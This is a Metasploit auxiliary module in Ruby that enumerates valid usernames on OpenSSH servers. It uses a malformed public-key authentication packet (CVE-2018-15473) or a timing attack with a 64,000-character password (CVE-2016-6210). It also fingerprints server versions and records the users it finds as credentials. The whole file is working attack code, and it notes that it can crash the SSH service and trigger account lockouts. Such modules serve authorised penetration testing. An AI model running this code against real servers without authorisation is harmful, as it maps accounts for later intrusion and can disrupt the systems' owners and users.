##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SSH Username Enumeration',
        'Description' => %q{
          This module uses a malformed packet or timing attack to enumerate users on
          an OpenSSH server.

          The Malformed Packet action (default) sends a malformed (corrupted)
          SSH_MSG_USERAUTH_REQUEST packet using public key authentication
          (which needs to be enabled server-side). OpenSSH <= 7.6 responds
          differently for valid vs. invalid users, exposing their existence
          (CVE-2018-15473).

          The Timing Attack action submits an oversized password via
          keyboard-interactive or password authentication. OpenSSH <= 7.2
          with UsePAM enabled returns 'permission denied' faster for invalid
          users than valid ones, exposing their existence via timing
          (CVE-2016-6210).

          NOTE: Invalid users were logged server side, while valid users were not. YMMV.
        },
        'Author' => [
          'kenkeiras',     # Timing attack
          'Dariusz Tytko', # Malformed packet
          'Michal Sajdak', # Malformed packet
          'Qualys',        # Malformed packet
          'wvu'            # Malformed packet
        ],
        'References' => [
          ['CVE', '2003-0190'],
          ['CVE', '2006-5229'],
          ['CVE', '2016-6210'],
          ['CVE', '2018-15473'],
          ['OSVDB', '32721'],
          ['BID', '20418'],
          ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
          ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Malformed Packet',
            {
              'Description' => 'Use a malformed packet (OpenSSH <= 7.6, CVE-2018-15473)',
              'Type' => :malformed_packet
            }
          ],
          [
            'Timing Attack',
            {
              'Description' => 'Use a timing attack (OpenSSH <= 7.2, CVE-2016-6210)',
              'Type' => :timing_attack
            }
          ]
        ],
        'DefaultAction' => 'Malformed Packet',
        'Notes' => {
          'Stability' => [
            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service
          ],
          'Reliability' => [],
          'SideEffects' => [
            IOC_IN_LOGS,
            ACCOUNT_LOCKOUTS, # timing attack submits a password
          ]
        }
      )
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptString.new('USERNAME',
                      [false, 'Single username to test (username spray)']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line']),
        OptBool.new('DB_ALL_USERS',
                    [false, 'Add all users in the current database to the list', false]),
        OptInt.new('THRESHOLD',
                   [
                     true,
                     'Amount of seconds needed before a user is considered ' \
                     'found (timing attack only)', 10
                   ]),
        OptBool.new('CHECK_FALSE',
                    [false, 'Check for false positives (random username)', true])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [
                     true, 'The number of attempts to connect to a SSH server' \
                   ' for each user', 3
                   ]),
        OptInt.new('SSH_TIMEOUT',
                   [
                     false, 'Specify the maximum time to negotiate a SSH session',
                     10
                   ]),
        OptBool.new('SSH_DEBUG',
                    [
                      false, 'Enable SSH debugging output (Extreme verbosity!)',
                      false
                    ])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def threshold
    datastore['THRESHOLD']
  end

  # Returns true if a nonsense username appears active.
  def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8..32)
    attempt_user(user, ip) == :success
  end

  def check_user(ip, user, port)
    technique = action['Type']

    opts = ssh_client_defaults.merge({
      port: port
    })

    # The auth method is converted into a class name for instantiation,
    # so malformed-packet here becomes MalformedPacket from the mixin
    case technique
    when :malformed_packet
      opts.merge!(auth_methods: ['malformed-packet'])
    when :timing_attack
      opts.merge!(
        auth_methods: ['password', 'keyboard-interactive'],
        password: rand_pass
      )
    end

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue Timeout::Error
      return :success if technique == :timing_attack
    rescue Net::SSH::AuthenticationFailed
      return :fail if technique == :malformed_packet
    rescue Net::SSH::Exception => e
      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - #{e.class}: #{e.message}")
    end

    finish_time = Time.new

    case technique
    when :malformed_packet
      return :success if ssh
    when :timing_attack
      elapsed = finish_time - start_time
      vprint_status("User '#{user}' - #{elapsed.round(2)}s (threshold: #{threshold}s)")
      return :success if elapsed > threshold
    end

    :fail
  end

  def rand_pass
    Rex::Text.rand_text_english(64_000..65_000)
  end

  def do_report(ip, rport, user)
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: 'ssh',
      name: name,
      info: "Found user '#{user}' via #{action.name}",
      refs: references
    )

    service_data = {
      address: ip,
      port: rport,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def user_list
    users = []

    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?

    if datastore['USER_FILE']
      fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    if datastore['DB_ALL_USERS']
      if framework.db.active
        db_users = framework.db.creds(workspace: myworkspace.name).filter_map { |o| o.public&.username }
        vprint_status("Loaded #{db_users.size} users from database")
        users += db_users
      else
        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
      end
    end

    users.uniq
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
      if attempt_num > 0
        Rex.sleep(2**attempt_num)
        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' found")
      do_report(ip, rport, user)
    when :connection_error
      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' could not connect")
    when :fail
      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' not found")
    end
  end

  def run
    if user_list.empty?
      fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE and/or USERNAME')
    end

    super
  end

  def grab_banner(ip)
    sock = Rex::Socket::Tcp.create(
      'PeerHost' => ip,
      'PeerPort' => rport,
      'Context' => { 'Msf' => framework }
    )
    sock.get_once(256, 10)&.strip
  rescue StandardError
    nil
  ensure
    begin
      sock&.close
    rescue StandardError
      nil
    end
  end

  def check_banner_version(ip, banner)
    return unless banner

    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - SSH banner: #{banner}")
    report_service(host: ip, port: rport, name: 'ssh', proto: 'tcp', info: banner)

    match = banner.match(/OpenSSH[_ ](\d+\.\d+)/i)
    return unless match

    version = Rex::Version.new(match[1])
    max_version, cve = case action['Type']
                       when :malformed_packet then ['7.6', 'CVE-2018-15473']
                       when :timing_attack then ['7.2', 'CVE-2016-6210']
                       end

    if version > Rex::Version.new(max_version)
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may NOT be vulnerable (#{action.name}/#{cve} affects <= #{max_version})")
    else
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may be vulnerable to #{action.name}/#{cve}")
    end
  end

  def run_host(ip)
    users = user_list

    banner = grab_banner(ip)
    check_banner_version(ip, banner)

    if datastore['CHECK_FALSE']
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking for false positives")
      vprint_warning("#{Rex::Socket.to_authority(rhost, rport)} - #{action.name} may be unreliable on low-latency networks") if action['Type'] == :timing_attack
      if check_false_positive(ip)
        print_error("#{Rex::Socket.to_authority(rhost, rport)} - False positive check failed as server returned valid for a random username")
        return
      end
    end

    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Starting SSH username enumeration")
    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
  end
end
